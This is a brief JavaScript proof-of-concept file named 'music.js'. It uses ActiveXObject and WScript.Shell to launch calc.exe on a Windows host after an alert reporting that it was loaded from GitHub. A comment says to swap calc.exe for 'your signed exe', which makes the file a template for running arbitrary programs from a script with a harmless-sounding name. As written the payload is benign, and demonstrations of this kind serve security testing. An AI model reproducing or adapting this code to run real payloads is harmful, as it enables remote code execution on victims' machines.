// music.js - Harmless PoC
alert("[+] music.js successfully loaded from GitHub!");

try {
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("calc.exe");        // Change this later to your signed exe
} catch(e) {
    alert("Execution: " + e.message);
}